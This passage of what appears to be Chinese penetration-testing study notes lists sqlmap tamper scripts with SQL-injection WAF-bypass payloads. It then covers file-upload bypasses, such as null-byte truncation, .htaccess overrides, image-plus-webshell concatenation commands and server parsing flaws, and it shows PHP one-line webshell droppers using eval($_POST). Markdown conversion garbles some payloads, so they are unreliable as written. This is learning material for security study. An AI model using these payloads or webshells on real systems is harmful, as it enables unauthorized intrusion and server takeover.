+<p>1’ and 1=1–+    <strong>to</strong>    &#49;&#39;&#32;&#97;&#110;&#100;&#32;&#49;&#61;&#49;&#45;&#45;&#43;</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="ifnull2ifisnull-py："><a href="#ifnull2ifisnull-py：" class="headerlink" title="ifnull2ifisnull.py："></a>ifnull2ifisnull.py：</h4><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p>
+<blockquote>
+<p>ifnull(1, 2)    <strong>to</strong>    if(isnull(1), 2, 1)</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySql</p>
+<h4 id="informationschemacomment-py："><a href="#informationschemacomment-py：" class="headerlink" title="informationschemacomment.py："></a>informationschemacomment.py：</h4><blockquote>
+<p>retVal = re.sub(r”(?i)(information_schema).”, “\g<1>/**/.”, payload)</1></p>
+</blockquote>
+<p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p>
+<blockquote>
+<p>select table_name from information_schema.tables    <strong>to</strong>    select table_name from information_schema/**/.tables</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="lowercase-py："><a href="#lowercase-py：" class="headerlink" title="lowercase.py："></a>lowercase.py：</h4><p>将 payload 里的大写转为小写</p>
+<blockquote>
+<p>UNION SELECT    <strong>to</strong>    union select</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="modsecurityversioned-py："><a href="#modsecurityversioned-py：" class="headerlink" title="modsecurityversioned.py："></a>modsecurityversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p>
+<blockquote>
+<p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!30874and 2&gt;1</em>/–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="modsecurityzeroversioned-py："><a href="#modsecurityzeroversioned-py：" class="headerlink" title="modsecurityzeroversioned.py："></a>modsecurityzeroversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p>
+<blockquote>
+<p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!00000and 2&gt;1</em>/–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="multiplespaces-py："><a href="#multiplespaces-py：" class="headerlink" title="multiplespaces.py："></a>multiplespaces.py：</h4><p>在关键字周围添加多个空格</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    union         select       1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="nonrecursivereplacement-py："><a href="#nonrecursivereplacement-py：" class="headerlink" title="nonrecursivereplacement.py："></a>nonrecursivereplacement.py：</h4><p>关键字双写，可用于关键字过滤</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    uniounionn selecselectt 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="overlongutf8-py："><a href="#overlongutf8-py：" class="headerlink" title="overlongutf8.py："></a>overlongutf8.py：</h4><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p>
+<blockquote>
+<p>select field from table where 2&gt;1    <strong>to</strong>    select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="percentage-py："><a href="#percentage-py：" class="headerlink" title="percentage.py："></a>percentage.py：</h4><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p>
+<blockquote>
+<p>select <em> from users    <strong>to</strong>    %s%e%l%e%c%t </em> %f%r%o%m %u%s%e%r%s</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p>
+<h4 id="plus2concat-py："><a href="#plus2concat-py：" class="headerlink" title="plus2concat.py："></a>plus2concat.py：</h4><p>用 concat 函数来替代加号，用于加号被过滤的情况</p>
+<blockquote>
+<p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select concat(char(113),char(114),char(115)) from user</p>
+</blockquote>
+<p><strong>适用数据库：</strong>SQL Server 2012+</p>
+<h4 id="plus2fnconcat-py："><a href="#plus2fnconcat-py：" class="headerlink" title="plus2fnconcat.py："></a>plus2fnconcat.py：</h4><p>用 fn concat 来替代加号，和上面类似</p>
+<blockquote>
+<p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p>
+</blockquote>
+<p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p>
+<h4 id="randomcase-py："><a href="#randomcase-py：" class="headerlink" title="randomcase.py："></a>randomcase.py：</h4><p>将 payload 随机大小写，可用于大小写绕过的情况</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    UniOn SElect 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="randomcomments-py："><a href="#randomcomments-py：" class="headerlink" title="randomcomments.py："></a>randomcomments.py：</h4><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    un/<strong>/ion sele/</strong>/ct 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="securesphere-py："><a href="#securesphere-py：" class="headerlink" title="securesphere.py："></a>securesphere.py：</h4><blockquote>
+<p>return payload + “ and ‘0having’=’0having’” if payload else payload</p>
+</blockquote>
+<p>在 payload 后面加入字符串，可以自定义</p>
+<blockquote>
+<p>1’ and 1=1    <strong>to</strong>    1’ and 1=1 ‘0having’=’0having’</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="sp-password-py："><a href="#sp-password-py：" class="headerlink" title="sp_password.py："></a>sp_password.py：</h4><blockquote>
+<p>retVal = “%s%ssp<em>password” % (payload, “– “ if not any(</em> if <em> in payload else None for </em> in (‘#’, “– “)) else “”)</p>
+</blockquote>
+<p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p>
+<blockquote>
+<p>1’  and 1=1–+    <strong>to</strong>    1 and 1=1– sp_password</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MSSQL</p>
+<h4 id="space2comment-py："><a href="#space2comment-py：" class="headerlink" title="space2comment.py："></a>space2comment.py：</h4><p>用 /**/ 替代空格，用于空格的绕过</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    union/<strong>/select/</strong>/1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="space2dash-py："><a href="#space2dash-py：" class="headerlink" title="space2dash.py："></a>space2dash.py：</h4><p>用注释符–和一个随机字符串加一个换行符替换控制符</p>
+<p>?union select 1,2–+    <strong>to</strong>    union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p>
+<p><strong>适用数据库：</strong>MSSQL、 SQLite</p>
+<h4 id="space2hash-py："><a href="#space2hash-py：" class="headerlink" title="space2hash.py："></a>space2hash.py：</h4><p>和上面类似，不过这儿是用#注释符</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="space2morecomment-py："><a href="#space2morecomment-py：" class="headerlink" title="space2morecomment.py："></a>space2morecomment.py：</h4><p>将空格用 /<strong>_</strong>/ 替代</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    union/<strong>_</strong>/select/<strong>_</strong>/1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="space2morehash-py："><a href="#space2morehash-py：" class="headerlink" title="space2morehash.py："></a>space2morehash.py：</h4><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p>
+<blockquote>
+<p>space2hash.py：        union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2–+</p>
+<p>space2morehash.py：union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p>
+<h4 id="space2mssqlblank-py："><a href="#space2mssqlblank-py：" class="headerlink" title="space2mssqlblank.py："></a>space2mssqlblank.py：</h4><blockquote>
+<p>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p>
+</blockquote>
+<p>用这些随机空白符替换 payload 中的空格</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    union%01select%021,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>SQL Server</p>
+<h4 id="space2mssqlhash-py："><a href="#space2mssqlhash-py：" class="headerlink" title="space2mssqlhash.py："></a>space2mssqlhash.py：</h4><p>用 # 加一个换行符替换 payload 中的空格</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong>    union%23%0Aselect%23%0A1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MSSQL、MySQL</p>
+<h4 id="space2mysqlblank-py："><a href="#space2mysqlblank-py：" class="headerlink" title="space2mysqlblank.py："></a>space2mysqlblank.py：</h4><blockquote>
+<p>blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p>
+</blockquote>
+<p>用这些随机空白符替换payload中的空格</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    union%09select%0D1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="space2mysqldash-py："><a href="#space2mysqldash-py：" class="headerlink" title="space2mysqldash.py："></a>space2mysqldash.py：</h4><p>用 – 加一个换行符替换空格</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    union–%0Aselect–%0A1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL、MSSQL</p>
+<h4 id="space2plus-py："><a href="#space2plus-py：" class="headerlink" title="space2plus.py："></a>space2plus.py：</h4><p>用 + 替换空格</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    union+select+1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="space2randomblank-py："><a href="#space2randomblank-py：" class="headerlink" title="space2randomblank.py："></a>space2randomblank.py：</h4><blockquote>
+<p>blanks = (“%09”, “%0A”, “%0C”, “%0D”)</p>
+</blockquote>
+<p>用这些随机空白符替换 payload 中的空格</p>
+<blockquote>
+<p>union select 1,2–+    <strong>to</strong>    union%09select%0C1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="symboliclogical-py："><a href="#symboliclogical-py：" class="headerlink" title="symboliclogical.py："></a>symboliclogical.py：</h4><blockquote>
+<p>retVal = re.sub(r”(?i)\bAND\b”, “%26%26”, re.sub(r”(?i)\bOR\b”, “%7C%7C”, payload))</p>
+</blockquote>
+<p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p>
+<blockquote>
+<p>1 and 1=1    <strong>to</strong>    1 %26%26 1=1</p>
+<p>1 or 1=1    <strong>to</strong>    1 %7c%7c 1=1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="unionalltounion-py："><a href="#unionalltounion-py：" class="headerlink" title="unionalltounion.py："></a>unionalltounion.py：</h4><blockquote>
+<p>return payload.replace(“UNION ALL SELECT”, “UNION SELECT”) if payload else payload</p>
+</blockquote>
+<p>用 union select 替换union all select</p>
+<blockquote>
+<p>union all select 1,2–+    <strong>to</strong>    union select 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="unmagicquotes-py："><a href="#unmagicquotes-py：" class="headerlink" title="unmagicquotes.py："></a>unmagicquotes.py：</h4><p>用宽字符绕过 GPC addslashes</p>
+<blockquote>
+<p>1‘ and 1=1    <strong>to</strong>    1%df%27 and 1=1–</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="uppercase-py："><a href="#uppercase-py：" class="headerlink" title="uppercase.py："></a>uppercase.py：</h4><p>将 payload 大写</p>
+<blockquote>
+<p>union select    <strong>to</strong>    UNION SELECT</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="varnish-py："><a href="#varnish-py：" class="headerlink" title="varnish.py："></a>varnish.py：</h4><blockquote>
+<p>headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload</p>
+</blockquote>
+<p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p>
+<p>还可以自定义：</p>
+<blockquote>
+<p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><p>对不是函数的关键字进行注释</p>
+<blockquote>
+<p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#    </p>
+</blockquote>
+<p><strong>to</strong>    </p>
+<blockquote>
+<p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="versionedmorekeywords-py："><a href="#versionedmorekeywords-py：" class="headerlink" title="versionedmorekeywords.py："></a>versionedmorekeywords.py：</h4><p>注释每个关键字</p>
+<blockquote>
+<p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p>
+</blockquote>
+<p><strong>to</strong></p>
+<blockquote>
+<p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p>
+<h4 id="xforwardedfor-py："><a href="#xforwardedfor-py：" class="headerlink" title="xforwardedfor.py："></a>xforwardedfor.py：</h4><blockquote>
+<p>headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p>
+</blockquote>
+<p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p>
+<p><strong>适用数据库：</strong>ALL</p>
+<h2 id="第4章-Web安全原理剖析"><a href="#第4章-Web安全原理剖析" class="headerlink" title="第4章 Web安全原理剖析"></a><strong>第4章 Web安全原理剖析</strong></h2><p>Web渗透的核心技术包括SQL注入﹑XSS攻击﹑CSRF攻击﹑SSRF攻击﹑暴力破解﹑文件上传﹑命令执行漏洞攻击﹑逻辑漏洞攻击﹑XXE漏洞攻击和WAF绕过等。本章依次将这些常见高危漏洞提取出来，从原理到利用，从攻击到防御，一一讲解。</p>
+<p>●    SQL注入漏洞，讨论各种攻击手法，从最明显﹑最简单的方法到一系列高级攻击技巧，包括SQL注入绕过技术；</p>
+<p>●    XSS攻击，讲解了XSS的形成原理﹑三种XSS类型﹑XSS常用语句﹑XSS编码绕过以及任何使用XSS平台测试XSS，最后提出了对XSS漏洞的修复意见；</p>
+<p>以及CSRF漏洞﹑SSRF漏洞﹑XXE漏洞﹑暴力破解漏洞﹑命令执行漏洞﹑文件上传漏洞﹑逻辑漏洞的形成原理﹑漏洞利用﹑代码分析，以及要如何对它们进行修复。</p>
+<h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="sql注入中tips"><a href="#sql注入中tips" class="headerlink" title="sql注入中tips"></a>sql注入中tips</h3><p>布尔型注入使用burp爆破以代替手注</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252114_327.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252113_363.png" alt=""></p>
+<p>宽字节注入原因：</p>
+<p>数据库使用GBK，被转义符转义，</p>
+<p>加上%df。反斜杠是%5c,连接再一起%df%5c</p>
+<h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>id=1</p>
+<p>变为id=MQ%3d%3d</p>
+<p>访问1’即为id=MSc%3d 注入的语句都使用base64编码</p>
+<h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>x-forward-for注入</p>
+<p>代码分析</p>
+<p>php中的getenv()函数用于获取一个环境变量的值，类似于<code>$_server或者$_ENV</code>返回环境变量对应的值，如果环境变量不存在则返回false</p>
+<h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>And Order </p>
+<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>anandd绕过and过滤</p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>url全编码</p>
+<p>两次url全编码</p>
+<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><pre><code>/*!and*/
+</code></pre><h3 id="sql防御"><a href="#sql防御" class="headerlink" title="sql防御"></a>sql防御</h3><p>1.过滤危险字符</p>
+<p>2.使用预编译</p>
+<p>pdo预编译</p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>dom xss是基于dom文档对象模型的</p>
+<p>xss绕过编码：js编码，html实体编码，url编码</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h4><h4 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h4><p>有些Apache允许解析其他文件后缀的，例如在http.conf中，如果配置如下代码</p>
+<pre><code>AddType application/x-httpd-php .php .phtml
+</code></pre><p>所以可以上传一个后缀为phtml的Webshell。</p>
+<ul>
+<li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li>
+<li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li>
+</ul>
+<h4 id="文件截断绕过"><a href="#文件截断绕过" class="headerlink" title="文件截断绕过"></a>文件截断绕过</h4><p>截断条件：php版本小于5.3.4 php的magic_quotes_gpc为OFF</p>
+<p>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</p>
+<p>实际操作：1.php%00.jpg</p>
+<p>选中%00进行url编码</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805101116_179.png" alt=""></p>
+<p>或者 test.asp .jpg 去burp hex中20更改00</p>
+<h4 id="服务端检测绕过-文件类型MIME-类型检测"><a href="#服务端检测绕过-文件类型MIME-类型检测" class="headerlink" title="服务端检测绕过(文件类型MIME 类型检测)"></a>服务端检测绕过(文件类型MIME 类型检测)</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071824_866.png" alt=""></p>
+<p>修改Content-Type 为image/jpeg</p>
+<h4 id="服务端验证绕过-文件完整性检测"><a href="#服务端验证绕过-文件完整性检测" class="headerlink" title="服务端验证绕过(文件完整性检测)"></a>服务端验证绕过(文件完整性检测)</h4><p>- 文件头检测 主要是在文件内容开始设置好图片文件的幻数 要绕过 jpg 文件检测就要在文件开头写上下图的值</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808281727_203.png" alt=""></p>
+<p>在php中还存在一种类似的文件上传绕过，php函数getimagesize(可以获取图片的宽高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。</p>
+<p>但是可以讲一个图片和一个webshell合并为一个文件，例如使用以下命令，</p>
+<p>cat image.png webshell.php &gt; image.php</p>
+<p>copy 1.jpg/b+lubr.php/a 1lubr.jpg</p>
+<p>此时使用getimagesize()就获取到图片信息，且webshell的后缀是php也能被Apache解析为脚本文件</p>
+<h4 id="服务端检测绕过-文件扩展名检测"><a href="#服务端检测绕过-文件扩展名检测" class="headerlink" title="服务端检测绕过(文件扩展名检测)"></a>服务端检测绕过(文件扩展名检测)</h4><ul>
+<li><p>黑名单检测</p>
+<ol>
+<li><p>文件名大小写绕过<br> 用像 AsP，pHp 之类的文件名绕过黑名单检测</p>
+</li>
+<li><p>名单列表绕过<br> 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类.还有php2、php3、</p>
+</li>
+<li><p>特殊文件名绕过<br> 比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式<br> 在 windows是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会<br> 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p>
+</li>
+<li><p>0x00 截断绕过</p>
+<p> 截断条件：php版本小于5.3.4 php的magic_quotes_gpc为OFF</p>
+<p> 假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</p>
+<p> 实际操作：1.php%00.</p>
+<p> jpg</p>
+<p> 选中%00进行url编码</p>
+<p> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805101116_179.png" alt=""></p>
+<p> 或者 test.asp .jpg 去burp hex中20更改00</p>
+</li>
+<li><p>htaccess 文件攻击<br> 配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p>
+<p> 该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p>
+<pre><code> &lt;FilesMatch &quot;_php.gif&quot;&gt;
+  SetHandler application/x-httpd-php
+ &lt;/FilesMatch&gt;
+</code></pre><p> 保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="external">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有.htaccess文件，那么我们可以上传.htaccess文件覆盖掉原来的文件。</p>
+</li>
+<li><p>解析调用/漏洞绕过<br> 这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p>
+</li>
+</ol>
+</li>
+<li><p>白名单检测</p>
+</li>
+<li><p>.htaccess 文件攻击</p>
+</li>
+</ul>
+<h4 id="服务端检测绕过-文件内容检测"><a href="#服务端检测绕过-文件内容检测" class="headerlink" title="服务端检测绕过(文件内容检测)"></a>服务端检测绕过(文件内容检测)</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071849_233.png" alt=""></p>
+<ul>
+<li><p>文件幻数检测</p>
+<p>  JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>  GIF ： 47 49 46 38 39 61 (GIF89a)<br>  PNG： 89 50 4E 47</p>
+</li>
+<li><p>文件相关信息检测</p>
+<p>  图像文件相关信息检测常用的就是 getimagesize()函数</p>
+</li>
+</ul>
+<pre><code>只需要把文件头部分伪造好就 ok 
+GIF89a
+</code></pre><p>  &lt;?php phpinfo();?&gt;</p>
+<ul>
+<li><p>文件加载检测</p>
+<p>  绕过方法：<br>  针对渲染加载测试：代码注入绕过<br>  针对二次渲染测试：攻击文件加载器</p>
+</li>
+</ul>
+<h4 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h4><h5 id="Apache-解析漏洞-1"><a href="#Apache-解析漏洞-1" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h5><ul>
+<li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li>
+<li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li>
+</ul>
+<h5 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h5><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p>
+<p>描述：</p>
+<h5 id="IIS5-x-6-0解析漏洞"><a href="#IIS5-x-6-0解析漏洞" class="headerlink" title="IIS5.x/6.0解析漏洞"></a>IIS5.x/6.0解析漏洞</h5><p>1.<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析</p>
+<p><strong>利用方法有两种</strong>:</p>
+<pre><code>1. 畸形目录解析
+/xxxx.asp/xxx.jpg
+
+2. 分号文件解析
+test.asp;.jpg
+</code></pre><ul>
+<li>第1种是因为xxx.jpg图片文件在某个以.asp结尾的目录下面，而被IIS当成可执行文件来解析</li>
+<li>第2种虽然以.jpg结尾，但IIS 解析时忽略了分号”;”后面的部分，当成了test.asp文件来解析</li>
+</ul>
+<p>IIS7.0/7,5</p>
+<p>在默认Fast-CGI开启状况下 </p>
+<p>2.<code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p>
+<p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p>
+<h5 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h5><ul>
+<li><p>解析：</p>
+<ol>
+<li><p>任意文件名/任意文件名.php</p>
+<p> 将shell语句，如</p>
+<pre><code> &lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;
+</code></pre><p> 写在文本xx.txt中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后</p>
+<pre><code> copy xx.jpg/b + xx.txt/a test.jpg
+</code></pre><p> 上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p>
+</li>
+<li><p>任意文件名%00.php都当作php来解析</p>
+<pre><code> xx.jpg%00.php
+</code></pre></li>
+</ol>
+</li>
+<li><p>描述：例如原文件名test.jpg但内容包含php一句话添加为test.jpg/x.php来进行解析攻击低版本可以子任意文件名后添加%00.php进行截断攻击</p>
+</li>
+<li><p>对应版本：</p>
+<p>  nginx 0.5.* [Success]</p>
+<p>  nginx 0.6.* [Success]</p>
+<p>  nginx 0.7 &lt;= 0.7.65 [Success]</p>
+<p>  nginx 0.8 &lt;= 0.8.37 [Success]</p>
+</li>
+</ul>
+<h4 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h4><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否含有webshell，如果包含则删除。</p>
+<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个PHP文件Bigbroke.php，内容为：</p>
+<pre><code class="php">&lt;?php fputs(fopen(&quot;./shell.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;Bigbroke&quot;]) ?&gt;&#39;); ?&gt;
+</code></pre>
